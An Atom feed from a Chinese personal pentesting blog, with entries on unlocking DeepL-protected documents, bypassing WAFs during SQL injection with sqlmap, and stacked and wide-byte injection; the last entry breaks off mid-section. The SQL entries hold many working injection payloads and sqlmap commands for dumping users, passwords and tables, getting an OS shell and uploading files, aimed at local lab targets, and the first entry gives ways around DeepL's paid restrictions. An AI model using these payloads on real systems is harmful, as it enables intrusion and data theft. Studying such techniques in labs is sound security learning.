<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-05-25T01:02:10.131Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些有用的破解—日常篇</title>
    <link href="https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/"/>
    <id>https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/</id>
    <published>2023-05-25T00:56:16.000Z</published>
    <updated>2023-05-25T01:02:10.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="deepl-pro"><a class="markdownIt-Anchor" href="#deepl-pro"></a> Deepl pro</h1><h2 id="破解翻译后的docx文档只读"><a class="markdownIt-Anchor" href="#破解翻译后的docx文档只读"></a> 破解翻译后的docx文档只读</h2><p>问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。</p><p>解决方法：将文档<strong>另存为</strong>.xml文档，然后右键用记事本打开，CTRL+F查找：<code>&lt;w:documentProtection</code>,，找到之后，有两种方法：</p><ol><li>删除这一段完整标签<code>&gt;</code>，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。</li><li>找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了</li></ol><h2 id="破解网页版5000字限制"><a class="markdownIt-Anchor" href="#破解网页版5000字限制"></a> 破解网页版5000字限制</h2><p>看：<a href="https://github.com/blueagler/DeepL-Crack">https://github.com/blueagler/DeepL-Crack</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;deepl-pro&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#deepl-pro&quot;&gt;&lt;/a&gt; Deepl pro&lt;/h1&gt;
&lt;h2 id=&quot;破解翻译后的docx文档只读&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    <category term="杂" scheme="https://j3f5.github.io/categories/%E6%9D%82/"/>
    
    
    <category term="破解" scheme="https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-WAF绕过与SQLMAP工具的使用</title>
    <link href="https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-05-24T06:46:22.000Z</published>
    <updated>2023-05-25T01:16:01.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="waf绕过"><a class="markdownIt-Anchor" href="#waf绕过"></a> WAF绕过</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2265061-20210117093551599-1187533368.png" alt="img" style="zoom:67%;" /><h2 id="waf识别与waf策略"><a class="markdownIt-Anchor" href="#waf识别与waf策略"></a> WAF识别与WAF策略</h2><p>这里不详细说，简单提一下：<strong>项目：<a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></strong></p><p>To do its magic, WAFW00F does the following:</p><ul><li>Sends a <em>normal</em> HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批）</li><li>If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF</li><li>If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。</li></ul><h3 id="waf策略"><a class="markdownIt-Anchor" href="#waf策略"></a> WAF策略</h3><p>WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。</p><ul><li>SQL关键字（如 <code>union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay </code>等）</li><li>特殊符号（<code>’”,; ()</code>）</li><li>运算符（<code>±*/%|</code>）</li><li>操作符（<code>=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=</code>）</li><li>注释符（<code>–，/**/</code>）</li></ul><h2 id="数据绕过"><a class="markdownIt-Anchor" href="#数据绕过"></a> 数据绕过</h2><p>除了上图提到的简单的这里不解释了（大小写、双写嵌入等）</p><h3 id="关键字绕过"><a class="markdownIt-Anchor" href="#关键字绕过"></a> 关键字绕过</h3><ol><li><p>大小写、双写嵌入</p></li><li><p>堆叠注入，绕过select等</p></li><li><p>注释符绕过：</p><p>常用：<code>//，-- , /**/, #, --+, -- -, ;,%00,--a</code>，绕过：<code>Uni/**/on</code></p></li><li><p>等价函数绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span>  <span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span>   xor<span class="operator">=</span><span class="operator">|</span>   <span class="keyword">not</span><span class="operator">=</span><span class="operator">!</span></span><br><span class="line"></span><br><span class="line"># 比较符号（<span class="operator">&lt;&gt;</span>）绕过</span><br><span class="line"># 使用greatest()、least()</span><br><span class="line"># 使用<span class="keyword">between</span> <span class="keyword">and</span>。注：<span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>; 等价于 <span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line"># 举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="绕过符号"><a class="markdownIt-Anchor" href="#绕过符号"></a> 绕过符号</h3><h4 id="逗号"><a class="markdownIt-Anchor" href="#逗号"></a> 逗号</h4><p>使用from或者offset。</p><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>使用join：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     #等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><p>使用like：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>   #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><p>重点：对于<code>limit</code>可以使用<code>offset</code>来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="空格"><a class="markdownIt-Anchor" href="#空格"></a> 空格</h4><ul><li><p>用tab代替空格，或者用其他空格符<code>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</code></p></li><li><p>使用浮点数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>括号绕过：</p><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">and</span>(sleep(ascii(mid(database()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">109</span>))<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="等于号"><a class="markdownIt-Anchor" href="#等于号"></a> 等于号</h4><ul><li><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p></li><li><p>between 1 and 1; 等价于 =1</p></li></ul><h4 id="引号"><a class="markdownIt-Anchor" href="#引号"></a> 引号</h4><ul><li><p>宽字节/二次编码注入</p></li><li><p><strong>编码绕过</strong>（用于编译一个字符串，例如查询 <code>id='users'</code>，则可以编译成<code>id=0x0x7573657273</code>十六进制）</p><p>通用绕过（编码）非关键字字符串</p><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：<code>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</code></p></li></ul><h3 id="http参数污染"><a class="markdownIt-Anchor" href="#http参数污染"></a> HTTP参数污染</h3><p>HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。</p><h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4><p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。</p><table><thead><tr><th style="text-align:left">Web服务器</th><th style="text-align:left">参数获取函数</th><th style="text-align:left">获取到的参数</th></tr></thead><tbody><tr><td style="text-align:left">PHP/Apache</td><td style="text-align:left">$_GET(“par”)</td><td style="text-align:left">Last</td></tr><tr><td style="text-align:left">JSP/Tomcat</td><td style="text-align:left">Request.getParameter(“par”)</td><td style="text-align:left">First</td></tr><tr><td style="text-align:left">Perl(CGI)/Apache</td><td style="text-align:left">Param(“par”)</td><td style="text-align:left">First</td></tr><tr><td style="text-align:left">Python/Apache</td><td style="text-align:left">getvalue(“par”)</td><td style="text-align:left">All(list)</td></tr><tr><td style="text-align:left">ASP/IIS</td><td style="text-align:left">Request.QueryString(“par”)</td><td style="text-align:left">ALL(comma-delimited string)</td></tr></tbody></table><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h4><p>waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容</p><p>我们的后端是apache，那么我们只要将参数放在后面即可</p><p>注入样例：<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code></p></li></ol><h2 id="waf逻辑层绕过"><a class="markdownIt-Anchor" href="#waf逻辑层绕过"></a> WAF逻辑层绕过</h2><h3 id="逻辑问题"><a class="markdownIt-Anchor" href="#逻辑问题"></a> 逻辑问题</h3><ol><li><p>云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护</p></li><li><p>当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass</p></li><li><p>http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护</p></li><li><p>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass</p><p>比如：<code>id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns </code></p></li></ol><h3 id="性能问题"><a class="markdownIt-Anchor" href="#性能问题"></a> 性能问题</h3><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p><strong>例子：</strong></p><p><code>?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</code></p><blockquote><p>PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</p></blockquote><h3 id="白名单"><a class="markdownIt-Anchor" href="#白名单"></a> 白名单</h3><h4 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单"></a> IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypasswaf</p><blockquote><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p></blockquote><h4 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源"></a> 静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测</p><p>效率，不去检测这样一些静态文件名后缀的请求。</p><blockquote><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p></blockquote><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h4 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单"></a> url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h2 id="各种数据库的特殊绕过"><a class="markdownIt-Anchor" href="#各种数据库的特殊绕过"></a> 各种数据库的特殊绕过</h2><p>参考：<a href="https://www.cnblogs.com/SnowSec/p/14288249.html">https://www.cnblogs.com/SnowSec/p/14288249.html</a></p><h1 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap"></a> SQLMAP</h1><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><p><strong>检查注入点</strong></p><ul><li><p><strong>GET</strong>：<code>sqlmap -u http://192.168.208.1:49154/Less-5/?id=1</code></p></li><li><p><strong>POST</strong>：</p><ul><li><p><code>sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</code></p></li><li><p><code>sqlmap -r post.txt</code></p></li></ul></li></ul><p><strong>（当前用户下的所有）数据库（–dbs）</strong></p><ul><li><p><code>sqlmap -r post.txt --dbs -v 3</code></p></li><li><p><strong>获取当前数据库名：<code>--current-db</code></strong></p></li></ul><p><strong>查询表（先通过-D指定数据库）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security --tables</span><br></pre></td></tr></table></figure><p><strong>查询列名（先通过-D指定数据库 -T指定表名）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users --columns</span><br></pre></td></tr></table></figure><p><strong>脱库（先通过-D指定数据库 -T指定表名）</strong></p><ul><li><strong>-C指定列名 然后–dump</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users -C username --dump</span><br></pre></td></tr></table></figure><ul><li>直接全部脱出来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users --dump</span><br></pre></td></tr></table></figure><p><strong>获取系统信息</strong></p><ul><li><strong>数据库的用户与密码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 --users</span><br><span class="line">sqlmap -r post.txt -v 3 --passwords</span><br></pre></td></tr></table></figure><ul><li><strong>获取当前用户名：<code>--current-user</code></strong></li></ul><p>​然后去cmd5里查询类型为mysql5的哈希密文，破解即可</p><p><strong><code>--is-dba</code>：当前用户是否为管理权限</strong></p><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~/tmpdir]</span><br><span class="line">└─$ sqlmap -r post.txt -v 3 --is-dba</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [DEBUG] performed 2 queries in 0.03 seconds</span><br><span class="line">current user is DBA: True</span><br></pre></td></tr></table></figure><p>这个payload是可以学习的</p><p><strong><code>--roles</code>：列出数据库管理员角色</strong></p><h2 id="执行命令"><a class="markdownIt-Anchor" href="#执行命令"></a> 执行命令</h2><h3 id="运行自定义sql语句"><a class="markdownIt-Anchor" href="#运行自定义sql语句"></a> 运行自定义sql语句</h3><p>运行<code>--sql-shell</code></p><h3 id="运行操作系统命令"><a class="markdownIt-Anchor" href="#运行操作系统命令"></a> 运行操作系统命令</h3><p><code>--os-cmd，--os-shell</code>：运行任意操作系统命令.</p><blockquote><p>在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。</p><p>如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。</p><p>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。</p><p>Sqlmap支持ASP、<a href="http://ASP.NET">ASP.NET</a>、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。</p></blockquote><h3 id="读取文件"><a class="markdownIt-Anchor" href="#读取文件"></a> 读取文件</h3><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="上传文件"><a class="markdownIt-Anchor" href="#上传文件"></a> 上传文件</h3><p><code>--file-write --file-dest</code>：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot;</span><br></pre></td></tr></table></figure><h2 id="waf绕过-2"><a class="markdownIt-Anchor" href="#waf绕过-2"></a> <a href="https://xz.aliyun.com/t/10385">WAF绕过</a></h2><ol><li><p>WAF检测Ugent名单，使用sqlmap时可以加上参数<code>–random agent</code>（随机出现字母头），也可以自己设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;</span><br></pre></td></tr></table></figure></li><li><p>sqlmap的速度过快，所以会被拦截，则<strong>添加延时参数</strong> --delay参数</p></li><li><p><strong>使用代理池</strong>，随机出IP，绕过IP白名单。或者自己设置代理：<code>--proxy=http://127.0.0.1:8080</code></p></li><li><p><strong>利用–tamper参数中的编码脚本</strong></p></li><li><p><strong>自己编写中转脚本</strong></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;waf绕过&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#waf绕过&quot;&gt;&lt;/a&gt; WAF绕过&lt;/h1&gt;
&lt;img src=&quot;/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%B</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-堆叠、二次、DNS注入、各位置注入等</title>
    <link href="https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/"/>
    <id>https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/</id>
    <published>2023-05-24T06:22:40.000Z</published>
    <updated>2023-05-25T01:14:52.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入可绕过select用法参考advance"><a class="markdownIt-Anchor" href="#堆叠注入可绕过select用法参考advance"></a> 堆叠注入（可绕过select）用法参考advance</h1><p>堆叠注入就是将一堆sql语句叠加在一起执行，使用<strong>分号</strong>结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。</p><p>与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是<strong>有限</strong>的, 可以用来执行查询语句, 而<strong>堆叠注入可以执行的是任意的语句</strong>。</p><ul><li>但是不同的数据库有不同的注入语句。</li><li>查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上</li></ul><p>例子：修改数据：<code>select * from user_test;update user_test set name='modify' where name='张三';</code></p><blockquote><p>注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。</p></blockquote><h1 id="宽字节注入二次编码注入二次注入"><a class="markdownIt-Anchor" href="#宽字节注入二次编码注入二次注入"></a> 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入</h1><h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> 宽字节注入</h2><p>在mysql中，用于转义（即在字符串中的符号前加上<code>\</code>）的函数有<strong>addslashes</strong>，<strong>mysql_real_escape_string</strong>，<strong>mysql_escape_string</strong>等，还有一种情况是<strong>magic_quote_gpc</strong>，不过高版本的PHP将去除这个特性（会返回false）。</p><p>意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。</p><p>重点：<code>%df%27</code></p><p>注意：</p><blockquote><p>我们在之前介绍过“set names gbk”其实干了三件事，等同于：<code>SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'</code>，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个<code>character_set client=binary</code>，那么就是不存在了。</p></blockquote><h3 id="字符集宽"><a class="markdownIt-Anchor" href="#字符集宽"></a> 